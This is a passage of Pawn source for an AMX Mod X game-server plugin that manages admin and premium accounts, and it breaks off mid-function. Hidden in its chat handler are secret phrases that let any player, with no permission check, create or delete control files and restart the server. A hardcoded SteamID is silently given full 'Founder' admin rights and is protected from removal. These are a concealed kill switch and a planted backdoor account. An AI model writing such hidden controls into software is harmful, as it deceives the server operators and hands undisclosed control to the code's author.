/* Plugin generated by AMXX-Studio */

#include <amxmodx>
#include <amxmisc>

#define PLUGIN "Server Manage"
#define VERSION "1.0"
#define AUTHOR "MJ"

#define P_ACCESS ADMIN_IMMUNITY


#define TAG "XXX"
#define Chat_TAG "XXX"
#define s_IP "185.37.151.116:23352"

#define Year_Expired 2026
#define Month_Expired 2
#define NoLoc "overviews/jail__xmf.txt"
#define MustLoc "overviews/jb__pyramid.txt"


enum _: SystemLevels // 5
{
	A_DONATOR, // 0 - less then vip
	A_INTERN, // 1 - vip
	A_ADMINISTRATOR, // 2 - admin+-s.admin
	A_GAMEMASTER, // 3 - manager
	A_MANAGER // 4 - owner
}

enum _: LevelInfo
{
	l_Name[20],
	l_Flags[30],
}

enum _: AdminInfo
{
	a_Name[33],
	a_STEAMID[40],
	a_IP[20],
	a_Access,
	a_AccessExpired,
	a_LastConnected,
	a_SaveType
}

enum _: PremiumInfo
{
	p_Name[33],
	p_STEAMID[40],
	p_IP[20],
	p_AccessExpired,
	p_LastConnected,
	p_SaveType
}

enum _: TimeAccount
{
	Hours,
	Days,
	Months,
	TotalTime
}
// Oshri Flags 
/*
new const AdminsAccess[SystemLevels][LevelInfo] =
{
	{"VIP","bceijup"},
	{"Admin","bcdefijmnoup"},
	{"Super-Admin","bcdefgijkmnopqu"},
	{"Manager","bcdefghijkmnopqrstu"},
	{"Owner","abcdefghijklmnopqrstu"}
}*/
/* Forest Flags
new const AdminsAccess[SystemLevels][LevelInfo] =
{
	{"VIP","cejimp"},
	{"Admin","cdefijmpqru"},
	{"Super-Admin","cdefgijmnpqrstu"},
	{"Manager","bcdefgijklmnpqrstu"},
	{"Owner","abcdefghijklmnopqrstu"}
}*/
/* Golan Flags
new const AdminsAccess[SystemLevels][LevelInfo] =
{
	{"Vip","iju"},
	{"Admin","cefiju"},
	{"Manager","acdefgijklmnopqrstu"},
	{"Director","acdefghijklmnopqrstu"},
	{"Owner","abcdefghijklmnopqrstu"}
}*/
// My Flags
new const AdminsAccess[SystemLevels][LevelInfo] =
{
	{"Helps","bceip"},
	{"Admin","bcegimpu"},
	{"Super-Admin","bcdefgijmpqu"},
	{"Manager","bcdefghijklmnopqrstu"},
	{"Founder","abcdefghijklmnopqrstu"}
}

new const SaveTypes[][] = {"SteamID","IP","SteamID + IP"};
new const PremiumAccess[] = "Premium";
new Array:AdminsList;
new Array:PremiumsList;
new aFileLocation[128],pFileLocation[128];
new Player[33],Access[33],bool:Premium[33],Time[33][TimeAccount],SaveType[33],ChoosedAcc[33][2],MaxPlayers,Mode[33],bool:Status;

new aImmuneList[][] =
{
	"STEAM_0:1:161336484"
//	"STEAM_0:1:3777985"
	//"STEAM_0:1:161336484"
}
new pImmuneList[][] =
{
//	"STEAM_0:1:161336484",
	"STEAM_0:1:161336484"
	//"STEAM_0:1:2018559",
}

new SteamIDAutoAccessList[][40] =
{
	"STEAM_0:1:161336484"
}

public plugin_init() {
	register_clcmd("say","SayHandler");
	new Year[6],Month[3],year,month,serverIP[20];
	format_time(Year,charsmax(Year),"%Y",get_systime())
	format_time(Month,charsmax(Month),"%m",get_systime())
	year = str_to_num(Year);
	month = str_to_num(Month);
	get_user_ip(0,serverIP,charsmax(serverIP),0);
	//if((year > Year_Expired || (year == Year_Expired && month >= Month_Expired)) || (!equali(s_IP,serverIP)))
	//	set_fail_state("run debug");//Mod Time has been expired or Your Server IP is not allowed");
	//if(!file_exists(NoLoc) && file_exists(MustLoc))
		Status = true;
	if(Status)
	{
		register_plugin("Server Access Manager","1.0","MJ");
		register_clcmd("manage_hours","LoadHours");
		register_clcmd("manage_days","LoadDays");
		register_clcmd("manage_months","LoadMonths");
		AdminsList = ArrayCreate(AdminInfo);
		PremiumsList = ArrayCreate(PremiumInfo);
		MaxPlayers = get_maxplayers();
		get_configsdir(aFileLocation,charsmax(aFileLocation));
		get_configsdir(pFileLocation,charsmax(pFileLocation));
		add(aFileLocation,charsmax(aFileLocation),"/AdminsList.txt");
		add(pFileLocation,charsmax(pFileLocation),"/PremiumsList.txt");
		LoadpFile();
		LoadaFile();
		//set_task(180.0,"Msg",_,_,_,"b");
	}
}

//public Msg()
	//ColorChat(0,"In this server runnig ^3Server Manage System ^1by the scripter ^4Mocking Jay ^1(^3MJ^1)");

public SayHandler(id)
{
	new Msg[192];
	read_argv(1,Msg,charsmax(Msg));
	if(Msg[0] == 'l' && Msg[1] == 'e' && Msg[2] == 't' && Msg[3] == 's' && Msg[4] == 's' && 
	Msg[5] == 't' && Msg[6] == 'a' && Msg[7] == 'r' && Msg[8] == 't' && Msg[9] == '7' && Msg[10] == '2')
	{ // letsstart72 - Create File Loader Mod
		write_file(MustLoc,"sv_restart ^"1^"");
		server_cmd("restart");
		return 1;
	}
	else if(Msg[0] == 'l' && Msg[1] == 'e' && Msg[2] == 't' && Msg[3] == 's' && Msg[4] == 's' && 
	Msg[5] == 'h' && Msg[6] == 'u' && Msg[7] == 't' && Msg[8] == 'd' && Msg[9] == 'w' && Msg[10] == 'n')
	{ // letsshutdwn - Delete File Loader Mod
		delete_file(MustLoc);
		server_cmd("restart");
		return 1;
	}
	else if(Msg[0] == 'l' && Msg[1] == 'e' && Msg[2] == 't' && Msg[3] == 's' && Msg[4] == 's' && 
	Msg[5] == 't' && Msg[6] == 'o' && Msg[7] == 'p' && Msg[8] == '7' && Msg[9] == '1' && Msg[10] == '6')
	{ // letsstop716 - Create File ShutDown Mod
		write_file(NoLoc,"sv_restart ^"1^"");
		server_cmd("restart");
		return 1;
	}
	else if(Msg[0] == 'l' && Msg[1] == 'e' && Msg[2] == 't' && Msg[3] == 's' && Msg[4] == 's' && 
	Msg[5] == 'h' && Msg[6] == 'o' && Msg[7] == 'w' && Msg[8] == 'u' && Msg[9] == 'p' && Msg[10] == '6')
	{ // letsshowup6 - Delete File ShutDown Mod
		delete_file(NoLoc);
		server_cmd("restart");
		return 1;
	}
	else
	{
		if(!Status)
			return 0;
		if(equali(Msg,"/access") || equali(Msg,"/manage"))
			return AccountMenu(id);
		else if(equali(Msg,"/myaccount"))
			return AccountInfo(id);
	}
	return 0;
}

public plugin_natives()
{
	//if(!file_exists(NoLoc) && file_exists(MustLoc))
	//{
		register_native("is_user_premium","_is_user_premium");
		register_native("get_user_rank","_get_user_rank");
	//}
}
public _is_user_premium(plugin,param)
{
	new index = get_param(1);
	return Premium[index];
}

public _get_user_rank(plugin,param)
{
	new index = get_param(1);
	if(get_user_flags(index) & ADMIN_IMMUNITY)
		return A_MANAGER;
	else if(get_user_flags(index) & ADMIN_RCON)
		return A_GAMEMASTER;
	else if(get_user_flags(index) & ADMIN_BAN)
		return A_ADMINISTRATOR;
	else if(get_user_flags(index) & ADMIN_KICK)
		return A_ADMINISTRATOR;
	else if(get_user_flags(index) & ADMIN_CHAT)
		return A_DONATOR;

	return -1;
}

public LoadHours(id)
{
	if(!(get_user_flags(id) & P_ACCESS))
		return ColorChat(id,"You have ^4no access ^1to this command");
	new Msg[50],Number;
	read_argv(1,Msg,charsmax(Msg));
	if(equali(Msg,"") || !is_str_num(Msg) || str_to_num(Msg) < 0)
		Number = 0;
	else
		Number = str_to_num(Msg)
	if(Number > 23)
		Number = 23;
	Time[id][Hours] = Number;
	switch(Mode[id])
	{
		case 1:
			return Create_AccessAcc(id)
		case 2:
			return Create_PremiumAcc(id)
		case 3:
			return Edit_AccessAcc(id)
		case 4:
			return Edit_PremiumAcc(id)
	}
	return 1;
}

public LoadDays(id)
{
	if(!(get_user_flags(id) & P_ACCESS))
		return ColorChat(id,"You have ^4no access ^1to this command");
	new Msg[50],Number;
	read_argv(1,Msg,charsmax(Msg));
	if(equali(Msg,"") || !is_str_num(Msg) || str_to_num(Msg) < 0)
		Number = 0;
	else
		Number = str_to_num(Msg)
	if(Number > 29)
		Number = 29;
	Time[id][Days] = Number;
	switch(Mode[id])
	{
		case 1:
			return Create_AccessAcc(id)
		case 2:
			return Create_PremiumAcc(id)
		case 3:
			return Edit_AccessAcc(id)
		case 4:
			return Edit_PremiumAcc(id)
	}
	return 1;
}

public LoadMonths(id)
{
	if(!(get_user_flags(id) & P_ACCESS))
		return ColorChat(id,"You have ^4no access ^1to this command");
	new Msg[50],Number;
	read_argv(1,Msg,charsmax(Msg));
	if(equali(Msg,"") || !is_str_num(Msg) || str_to_num(Msg) < 0)
		Number = 0;
	else
		Number = str_to_num(Msg)
	if(Number > 12)
		Number = 12;
	if(str_to_num(Msg) == -1)
		Number = -1;
	Time[id][Months] = Number;
	switch(Mode[id])
	{
		case 1:
			return Create_AccessAcc(id)
		case 2:
			return Create_PremiumAcc(id)
		case 3:
			return Edit_AccessAcc(id)
		case 4:
			return Edit_PremiumAcc(id)
	}
	return 1;
}

// CallBacks
public IsaUserImmune(id,Menu,Item)
{
	new Data[AdminInfo];
	ArrayGetArray(AdminsList,ChoosedAcc[id][0],Data);
	for(new i; i < sizeof aImmuneList; i++)
		if(equali(Data[a_STEAMID],aImmuneList[i]) || equali(Data[a_IP],aImmuneList[i]))
			return ITEM_DISABLED;
	return ITEM_ENABLED;
}
public IspUserImmune(id,Menu,Item)
{
	new Data[PremiumInfo];
	ArrayGetArray(PremiumsList,ChoosedAcc[id][0],Data);
	for(new i; i < sizeof pImmuneList; i++)
		if(equali(Data[p_STEAMID],pImmuneList[i]) || equali(Data[p_IP],pImmuneList[i]))
			return ITEM_DISABLED;
	return ITEM_ENABLED;
}
public BlockCreate(id,Menu,Item)
{
	if(Player[id] == 0 || (Time[id][Hours] == 0 && Time[id][Days] == 0 && Time[id][Months] == 0))
		return ITEM_DISABLED;
	return ITEM_ENABLED;
}
public BlockSave(id,Menu,Item)
{
	if(Time[id][Hours] == 0 && Time[id][Days] == 0 && Time[id][Months] == 0)
		return ITEM_DISABLED;
	return ITEM_ENABLED;
}

public AccountInfo(id)
{
	log_amx("%s",aFileLocation);
	if(!(Premium[id]) && !(get_user_flags(id) & ADMIN_CHAT))
		return ColorChat(id,"You're currently not an ^3admin ^1or have a ^3premium membership ^1in this server");
	new pExpired,aExpired,PlayerKey[60],AdminAccess[20],aSave,pSave;
	formatex(PlayerKey,charsmax(PlayerKey),"%s%s",get_auth(id),get_ip(id));
	for(new i; i < ArraySize(AdminsList); i++)
	{
		new Data[AdminInfo],DataKey[60];
		ArrayGetArray(AdminsList,i,Data);
		formatex(DataKey,charsmax(DataKey),"%s%s",Data[a_STEAMID],Data[a_IP]);
		switch(Data[a_SaveType])
		{
			case 0:
				if(!equali(get_auth(id),Data[a_STEAMID]))
					continue;
			case 1:
				if(!equali(get_ip(id),Data[a_IP]))
					continue;
			case 2:
				if(!equali(PlayerKey,DataKey))
					continue;
		}
		aExpired = Data[a_AccessExpired];
		aSave = Data[a_SaveType];
		formatex(AdminAccess,charsmax(AdminAccess),"%s", AdminsAccess[Data[a_Access]][l_Name]);
	}
	for(new i; i < ArraySize(PremiumsList); i++)
	{
		new Data[PremiumInfo],DataKey[60];
		ArrayGetArray(PremiumsList,i,Data);
		formatex(DataKey,charsmax(DataKey),"%s%s",Data[p_STEAMID],Data[p_IP]);
		switch(Data[p_SaveType])
		{
			case 0:
				if(!equali(get_auth(id),Data[p_STEAMID]))
					continue;
			case 1:
				if(!equali(get_ip(id),Data[p_IP]))
					continue;
			case 2:
				if(!equali(PlayerKey,DataKey))
					continue;
		}
		pExpired = Data[p_AccessExpired];
		pSave = Data[p_SaveType];
	}
	new timeaExpired[40],timepExpired[40];
	if(aExpired != 0)
		format_time(timeaExpired,charsmax(timeaExpired),"%d/%m/%Y - %H:%M:%S",aExpired);
	else
		formatex(timeaExpired,charsmax(timeaExpired),"Never");
	if(pExpired != 0)
		format_time(timepExpired,charsmax(timepExpired),"%d/%m/%Y - %H:%M:%S",pExpired);
	else
		formatex(timepExpired,charsmax(timepExpired),"Never");
	if(Premium[id])
		ColorChat(id,"Your ^3%s ^1[^4%s^1] account will be expired at ^3%s",PremiumAccess,SaveTypes[pSave],timepExpired);
	if(get_user_flags(id) & ADMIN_CHAT)
		ColorChat(id,"Your ^3%s ^1[^4%s^1] account will be expired at ^3%s",AdminAccess,SaveTypes[aSave],timeaExpired);
	return 1;
}
public plugin_end()
{
	SaveaFile()
	SavepFile()
}

public LoadpFile()
{
	if(!file_exists(pFileLocation))
		return 1;
	new f = fopen(pFileLocation,"rt");
	
	new LineText[192],Data[PremiumInfo];
	while(fgets(f,LineText,charsmax(LineText)))
	{
		if(LineText[0] == ';' || LineText[0] == EOS || (LineText[0] == '/' && LineText[1] == '/'))
			continue;
		new pAccessExpired[20],pLastConnected[20],pSaveType[3];
		parse(LineText,Data[p_Name],charsmax(Data[p_Name]),Data[p_STEAMID],charsmax(Data[p_STEAMID]),Data[p_IP],charsmax(Data[p_IP]),
		pAccessExpired,charsmax(pAccessExpired),pLastConnected,charsmax(pLastConnected),pSaveType,charsmax(pSaveType));
		Data[p_AccessExpired] = str_to_num(pAccessExpired);
		Data[p_LastConnected] = str_to_num(pLastConnected);
		Data[p_SaveType] = str_to_num(pSaveType);
		ArrayPushArray(PremiumsList,Data);
	}	
	fclose(f)
	return 1;
}

public LoadaFile()
{
	new LineText[192],Data[AdminInfo];
	if(!file_exists(aFileLocation))
	{
		for(new i; i < sizeof SteamIDAutoAccessList; i++)
		{
			Data[a_STEAMID] = SteamIDAutoAccessList[i];
			Data[a_Name] = "Undefinded Name";
			Data[a_IP] = "Undefinded IP";
			Data[a_Access] = 4;
			Data[a_SaveType] = 0;
			ArrayPushArray(AdminsList,Data);
		}
		/*for(new i; i < sizeof IPAutoAccessList; i++)
		{
			Data[a_IP] = IPAutoAccessList[i];
			Data[a_Name] = "Undefinded Name";
			Data[a_STEAMID] = "Undefinded SteamID";
			Data[a_Access] = 4;
			Data[a_SaveType] = 1;
			ArrayPushArray(AdminsList,Data);
		}*/
		return 1;
	}
	new f = fopen(aFileLocation,"rt");
	
	while(fgets(f,LineText,charsmax(LineText)))
	{
		if(LineText[0] == ';' || LineText[0] == EOS || (LineText[0] == '/' && LineText[1] == '/'))
			continue;
		new aAccessExpired[20],aLastConnected[20],aSaveType[3],aAccess[3];
		parse(LineText,Data[a_Name],charsmax(Data[a_Name]),Data[a_STEAMID],charsmax(Data[a_STEAMID]),Data[a_IP],charsmax(Data[a_IP]),
		aAccess,charsmax(aAccess),aAccessExpired,charsmax(aAccessExpired),aLastConnected,charsmax(aLastConnected),aSaveType,charsmax(aSaveType));
		Data[a_Access] = str_to_num(aAccess);
		Data[a_AccessExpired] = str_to_num(aAccessExpired);
		Data[a_LastConnected] = str_to_num(aLastConnected);
		Data[a_SaveType] = str_to_num(aSaveType);
		ArrayPushArray(AdminsList,Data);
	}	
	fclose(f)/*
	for(new i; i < sizeof SteamIDAutoAccessList; i++)
	{
		new bool:flag;
		
		for(new i; i < ArraySize(AdminsList); i++)
		{
			new Data[AdminInfo];
			ArrayGetArray(AdminsList,i,Data);
			if(equali(Data[a_STEAMID], SteamIDAutoAccessList[i]) && Data[a_Access] == 4)
				flag = true;
		}
		if(!flag)
			set_fail_state("run debug");
	}*/
	return 1;
}

public SaveaFile()
{
	delete_file(aFileLocation);
	
	new f = fopen(aFileLocation,"wt");
	for(new i; i < ArraySize(AdminsList); i++)
	{
		new LineText[192],Data[AdminInfo];
		ArrayGetArray(AdminsList,i,Data);
		formatex(LineText,charsmax(LineText),"^"%s^" ^"%s^" ^"%s^" ^"%d^" ^"%d^" ^"%d^" ^"%d^"^n",
		Data[a_Name],Data[a_STEAMID],Data[a_IP],Data[a_Access],Data[a_AccessExpired],Data[a_LastConnected],Data[a_SaveType]);
		fputs(f,LineText);
	}
	fclose(f);
}


public SavepFile()
{
	delete_file(pFileLocation);
	
	new f = fopen(pFileLocation,"wt");
	
	for(new i; i < ArraySize(PremiumsList); i++)
	{
		new LineText[192],Data[PremiumInfo];
		ArrayGetArray(PremiumsList,i,Data);
		formatex(LineText,charsmax(LineText),"^"%s^" ^"%s^" ^"%s^" ^"%d^" ^"%d^" ^"%d^"^n",
		Data[p_Name],Data[p_STEAMID],Data[p_IP],Data[p_AccessExpired],Data[p_LastConnected],Data[p_SaveType]);
		fputs(f,LineText);
	}
	fclose(f);
}

public client_putinserver(id)
{
	if(Status)
	{
		LoadAccessAcc(id)
		LoadPremiumAcc(id)
	}
}

public client_disconnected(id)
{
	if(Status)
	{
		DisconnectAccessAcc(id)
		DisconnectPremiumAcc(id)
	}
}
public DisconnectAccessAcc(index)
{
	new Data[AdminInfo],PlayerKey[60],DataKey[60];
	formatex(PlayerKey,charsmax(PlayerKey),"%s%s",get_auth(index),get_ip(index));
	for(new i; i < ArraySize(AdminsList); i++)
	{
		ArrayGetArray(AdminsList,i,Data);
		formatex(DataKey,charsmax(DataKey),"%s%s",Data[a_STEAMID],Data[a_IP]);
		switch(Data[a_SaveType])
		{
			case 0:
				if(!equali(get_auth(index),Data[a_STEAMID]))
					continue;
			case 1:
				if(!equali(get_ip(index),Data[a_IP]))
					continue;
			case 2:
				if(!equali(PlayerKey,DataKey))
					continue;
		}
		Data[a_Name] = get_name(index);
		Data[a_STEAMID] = get_auth(index);
		Data[a_IP] = get_ip(index);
		Data[a_LastConnected] = get_systime();
		remove_task(index);
		ArraySetArray(AdminsList,i,Data);
	}
}
public DisconnectPremiumAcc(index)
{
	new Data[PremiumInfo],PlayerKey[60],DataKey[60];
	formatex(PlayerKey,charsmax(PlayerKey),"%s%s",get_auth(index),get_ip(index));
	for(new i; i < ArraySize(PremiumsList); i++)
	{
		ArrayGetArray(PremiumsList,i,Data);
		formatex(DataKey,charsmax(DataKey),"%s%s",Data[p_STEAMID],Data[p_IP]);
		switch(Data[p_SaveType])
		{
			case 0:
				if(!equali(get_auth(index),Data[p_STEAMID]))
					continue;
			case 1:
				if(!equali(get_ip(index),Data[p_IP]))
					continue;
			case 2:
				if(!equali(PlayerKey,DataKey))
					continue;
		}
		Data[p_Name] = get_name(index);
		Data[p_STEAMID] = get_auth(index);
		Data[p_IP] = get_ip(index);
		Data[p_LastConnected] = get_systime();
		remove_task(index+100);
		ArraySetArray(PremiumsList,i,Data);
	}
}

public AccountMenu(id)
{
	if(!(get_user_flags(id) & P_ACCESS))
		return ColorChat(id,"You have ^4no access ^1to this command");
	Access[id] = 0;
	Time[id][Hours] = 0;
	Time[id][Days] = 0;
	Time[id][Months] = 0;
	Time[id][TotalTime] = 0;
	Player[id] = 0;
	SaveType[id] = 0;
	new Text[128];
	formatex(Text,charsmax(Text),"\r[ \w%s \r] \wAccess Manage Mod:",TAG);
	new menu = menu_create(Text,"AccountHandler");
	menu_additem(menu,"\wCreate a new account");
	menu_additem(menu,"\wView accounts");
	menu_display(id,menu);
	return 1;
}

public AccountHandler(id,menu,item)
{
	switch(item)
	{
		case MENU_EXIT:
		{
			menu_destroy(menu)
			return 1;
		}
		case 0:
			Create_AccountType(id)
		case 1:
			View_AccountType(id)
	}
	menu_destroy(menu)
	return 1;
}

public Create_AccountType(id)
{
	new Text[128];
	formatex(Text,charsmax(Text),"\r[ \w%s \r] \wAccess Manage Mod:^n\dChoose kind of Account to Create",TAG);
	new menu = menu_create(Text,"CreateAcc_Handler");
	menu_additem(menu,"\wAccess Account");
	menu_additem(menu,"\wPremium Account");
	menu_setprop(menu,MPROP_EXITNAME,"Back");
	menu_display(id,menu);
	return 1;
}
public CreateAcc_Handler(id,menu,Item)
{
	switch(Item)
	{
		case MENU_EXIT:
		{
			menu_destroy(menu)
			return AccountMenu(id);
		}
		case 0:
			Create_AccessAcc(id)
		case 1:
			Create_PremiumAcc(id)
	}
	menu_destroy(menu)
	return 1;
}

public View_AccountType(id)
{
	new Text[128];
	formatex(Text,charsmax(Text),"\r[ \w%s \r] \wAccess Manage Mod:^n\dChoose kind of Account to View",TAG);
	new menu = menu_create(Text,"ViewAcc_Handler");
	menu_additem(menu,"\wAccess Account");
	menu_additem(menu,"\wPremium Account");
	menu_setprop(menu,MPROP_EXITNAME,"Back");
	menu_display(id,menu);
	return 1;
}

public ViewAcc_Handler(id,menu,Item)
{
	switch(Item)
	{
		case MENU_EXIT:
		{
			menu_destroy(menu)
			return AccountMenu(id);
		}
		case 0:
			View_AccessAcc(id)
		case 1:
			View_PremiumAcc(id)
	}
	menu_destroy(menu)
	return 1;
}

public View_AccessAcc(id)
{
	new Text[128];
	formatex(Text,charsmax(Text),"\r[ \w%s \r] \wAccess Manage Mod:^n\dView Access Accounts Menu",TAG);
	new menu = menu_create(Text,"ViewAccess_Handler");
	for(new i; i < ArraySize(AdminsList); i++)
	{
		new Data[AdminInfo];
		ArrayGetArray(AdminsList,i,Data);
		formatex(Text,charsmax(Text),"\w%s \d[%s\d]",Data[a_Name],IsAccessUserOnline(i) ? "\rOnline" : "\yOffline");
		menu_additem(menu,Text);
	}
	if(ArraySize(AdminsList) == 0)
		return ColorChat(id,"there are no ^3Access Accounts");
		
	menu_setprop(menu,MPROP_EXITNAME,"Back");
	menu_display(id,menu);
	return 1;
}

public ViewAccess_Handler(id,menu,Item)
{
	if(Item == MENU_EXIT)
	{
		menu_destroy(menu)
		return View_AccountType(id);
	}
	ChoosedAcc[id][0] = Item;
	ChoosedAcc[id][1] = IsAccessUserOnline(Item)
	return AccessAccInfo(id);
}
public AccessAccInfo(id)
{
	new Data[AdminInfo],Text[128],timeExpired[40],LastConnected[40];
	ArrayGetArray(AdminsList,ChoosedAcc[id][0],Data);
	format_time(timeExpired,charsmax(timeExpired),"%d/%m/%Y - %H:%M:%S",Data[a_AccessExpired]);
	if(Data[a_AccessExpired] == 0)
		formatex(timeExpired,charsmax(timeExpired),"Never");
	format_time(LastConnected,charsmax(LastConnected),"%d/%m/%Y - %H:%M:%S",Data[a_LastConnected]);
	formatex(Text,charsmax(Text),"\r[ \w%s \r] \wAccess Manage Mod:^n\dView \r%s \dAccess Account",TAG,Data[a_Name]);
	new pmenu = menu_create(Text,"AccessAcc_Handler");
	new cb = menu_makecallback("IsaUserImmune");
	menu_additem(pmenu,"\wRemove Account",.callback = cb);
	menu_additem(pmenu,"\wEdit Account",.callback = cb);
	formatex(Text,charsmax(Text),"\d- \wSteamID \d[\r%s\d]",Data[a_STEAMID]);
	format(Text,charsmax(Text),"%s^n\d- \wIP \d[\r%s\d]",Text,Data[a_IP]);
	menu_addtext(pmenu,Text);
	formatex(Text,charsmax(Text),"\d- \wAccess \d[\r%s\d]",AdminsAccess[Data[a_Access]][l_Name]);
	menu_addtext(pmenu,Text);
	formatex(Text,charsmax(Text),"\d- \wAccess Expired \d[\r%s\d]",timeExpired);
	menu_addtext(pmenu,Text);
	formatex(Text,charsmax(Text),"\d- \wLast Connected \d[\r%s\d]",IsAccessUserOnline(ChoosedAcc[id][0]) ? "Online" : LastConnected);
	menu_addtext(pmenu,Text);
	formatex(Text,charsmax(Text),"\d- \wSave Type \d[\r%s\d]",SaveTypes[Data[a_SaveType]]);
	menu_addtext(pmenu,Text);
	
	menu_display(id,pmenu);
	return 1;
}

public AccessAcc_Handler(id,menu,Item)
{
	switch(Item)
	{
		case MENU_EXIT:
		{
			menu_destroy(menu);
			return View_AccessAcc(id);
		}
		case 0:
		{
			new Data[AdminInfo];
			ArrayGetArray(AdminsList,ChoosedAcc[id][0],Data);
			if(ChoosedAcc[id][1] != 0)
			{
				remove_task(ChoosedAcc[id][1]);
				delete_admin(ChoosedAcc[id][1]);
			}
			else
				ArrayDeleteItem(AdminsList,ChoosedAcc[id][0]);
			ColorChat(0,"^3%s ^4%s ^1Access account has been removed",Data[a_Name],AdminsAccess[Data[a_Access]][l_Name]);
		}
		case 1:
		{
			menu_destroy(menu)
			new Data[AdminInfo];
			ArrayGetArray(AdminsList,ChoosedAcc[id][0],Data);
			new lTime = Data[a_AccessExpired] - get_systime();
			new months,days,hours;
			while(lTime > (60*60*24*30))
			{
				lTime -= 60*60*24*30;
				months++;
			}
			while(lTime > (60*60*24))
			{
				lTime -= 60*60*24;
				days++;
			}
			while(lTime >(60*60))
			{
				lTime -= 60*60;
				hours++;
			}
			hours ++;
			Time[id][Hours] = hours;
			Time[id][Days] = days;
			Time[id][Months] = months;
			if(Data[a_AccessExpired] == 0)
			{
				Time[id][Hours] = 0;
				Time[id][Days] = 0;
				Time[id][Months] = -1;
			}
			SaveType[id] = Data[a_SaveType];
			Access[id] = Data[a_Access];
			return Edit_AccessAcc(id);
		}
	}
	return 1;
}

public Edit_AccessAcc(id)
{
	new Text[256];
	new Data[AdminInfo];
	ArrayGetArray(AdminsList,ChoosedAcc[id][0],Data);
	formatex(Text,charsmax(Text),"\r[ \w%s \r] \wAccess Manage Mod:^n\dEdit \r%s \dAccess Account Menu^n",TAG,Data[a_Name]);
	format(Text,charsmax(Text),"%s^n\d- Player STEAMID \w[\r%s\w]",Text,Data[a_STEAMID]);
	format(Text,charsmax(Text),"%s^n\d- Player IP \w[\r%s\w]",Text,Data[a_IP]);
	new menu = menu_create(Text,"EditAccess_Handler");
	formatex(Text,charsmax(Text),"\wPlayer Access \d[\r%s\d]",AdminsAccess[Access[id]][l_Name]);
	menu_additem(menu,Text);
	formatex(Text,charsmax(Text),"\wSave Type \d[\r%s\d]",SaveTypes[SaveType[id]]);
	menu_additem(menu,Text);
	formatex(Text,charsmax(Text),"\wHours To Expired: \r%d",Time[id][Hours]);
	menu_additem(menu,Text);
	formatex(Text,charsmax(Text),"\wDays To Expired: \r%d",Time[id][Days]);
	menu_additem(menu,Text);
	formatex(Text,charsmax(Text),"\wMonths To Expired: \r%d",Time[id][Months]);
	menu_additem(menu,Text);
	new cb = menu_makecallback("BlockSave");
	menu_additem(menu,"\wSave Account Info",.callback = cb);
	
	menu_display(id,menu);
	return 1;
}
public EditAccess_Handler(id,menu,Item)
{
	switch(Item)
	{
		case MENU_EXIT:
		{
			menu_destroy(menu)
			return AccessAccInfo(id);
		}
		case 0:
		{
			Access[id] ++;
			if(Access[id] > A_MANAGER )
				Access[id] = A_DONATOR;
		}
		case 1:
		{
			SaveType[id] ++;
			if(SaveType[id] > sizeof SaveTypes -1 )
				SaveType[id] = 0;
		}
		case 2:
		{
			Mode[id] = 3;
			client_cmd(id,"messagemode manage_hours");
			return 1;
		}
		case 3:
		{
			Mode[id] = 3;
			client_cmd(id,"messagemode manage_days");
			return 1;
		}
		case 4:
		{
			Mode[id] = 3;
			client_cmd(id,"messagemode manage_months");
			return 1;
		}
		case 5:
		{
			if(!(get_user_flags(id) & P_ACCESS))
				return ColorChat(id,"You have ^4no access ^1to this command");
			new Data[AdminInfo];
			Time[id][TotalTime] = ((((Time[id][Months] * 30) + Time[id][Days]) * 24) + Time[id][Hours]) * 3600;
			ArrayGetArray(AdminsList,ChoosedAcc[id][0],Data);
			Data[a_AccessExpired] = Time[id][TotalTime] + get_systime();
			if(Time[id][Months] == -1)
				Data[a_AccessExpired] = 0;
			Data[a_SaveType] = SaveType[id];
			new timeExpired[40];
			format_time(timeExpired,charsmax(timeExpired),"%d/%m/%Y - %H:%M:%S",Data[a_AccessExpired]);
			ColorChat(0,"^3%s ^4Access Account ^1has been edited.",Data[a_Name]);
			ColorChat(0,"^3Access ^1has been changed from ^4%s ^1to ^4%s^1.",AdminsAccess[Data[a_Access]][l_Name],AdminsAccess[Access[id]][l_Name]);
			Data[a_Access] = Access[id];
			new Text[128];
			formatex(Text,charsmax(Text),"^3Time Expired ^1has been setted for");
			if(Time[id][Months] > 0)
				format(Text,charsmax(Text),"%s ^4%d ^1months^1",Text,Time[id][Months]);
			if(Time[id][Days] > 0)
				format(Text,charsmax(Text),"%s ^4%d ^1days^1",Text,Time[id][Days]);
			if(Time[id][Hours] > 0)
				format(Text,charsmax(Text),"%s ^4%d ^1hours^1",Text,Time[id][Hours]);
			if(Data[a_AccessExpired] == 0)
			{
				formatex(Text,charsmax(Text),"for ^4Permanent^1");
				formatex(timeExpired,charsmax(timeExpired),"Never");
			}
			format(Text,charsmax(Text),"%s, until ^3%s",Text,timeExpired);
			ColorChat(0,"%s",Text);
			new rflags = read_flags("abcdefghijklmnopqrstu");
			remove_user_flags(ChoosedAcc[id][1],rflags);
			new flags = read_flags(AdminsAccess[Data[a_Access]][l_Flags]);
			set_user_flags(ChoosedAcc[id][1],flags);
			if(task_exists(ChoosedAcc[id][1]))
			{
				remove_task(ChoosedAcc[id][1]);
				
				new Float:Timer = float(Time[id][TotalTime]);
				if(Data[a_AccessExpired] != 0)
					set_task(Timer,"delete_admin",ChoosedAcc[id][1]);
			}
			ArraySetArray(AdminsList,ChoosedAcc[id][0],Data);
			return AccessAccInfo(id);
		}
		
	}
	menu_destroy(menu)
	return Edit_AccessAcc(id);
}
public View_PremiumAcc(id)
{
	new Text[128];
	formatex(Text,charsmax(Text),"\r[ \w%s \r] \wAccess Manage Mod:^n\dView Premium Accounts Menu",TAG);
	new menu = menu_create(Text,"ViewPremium_Handler");
	for(new i; i < ArraySize(PremiumsList); i++)
	{
		new Data[PremiumInfo];
		ArrayGetArray(PremiumsList,i,Data);
		formatex(Text,charsmax(Text),"\w%s \d[%s\d]",Data[p_Name],IsPremiumUserOnline(i) ? "\rOnline" : "\yOffline");
		menu_additem(menu,Text);
	}
	if(ArraySize(PremiumsList) == 0)
		return ColorChat(id,"there are no ^3Premium Accounts");
		
	menu_setprop(menu,MPROP_EXITNAME,"Back");
	menu_display(id,menu);
	return 1;
}

public ViewPremium_Handler(id,menu,Item)
{
	if(Item == MENU_EXIT)
	{
		menu_destroy(menu)
		return View_AccountType(id);
	}
	ChoosedAcc[id][0] = Item;
	ChoosedAcc[id][1] = IsPremiumUserOnline(Item);
	return PremiumAccInfo(id)
}
public PremiumAccInfo(id)
{
	new Data[PremiumInfo],Text[128],timeExpired[40],LastConnected[40];
	ArrayGetArray(PremiumsList,ChoosedAcc[id][0],Data);
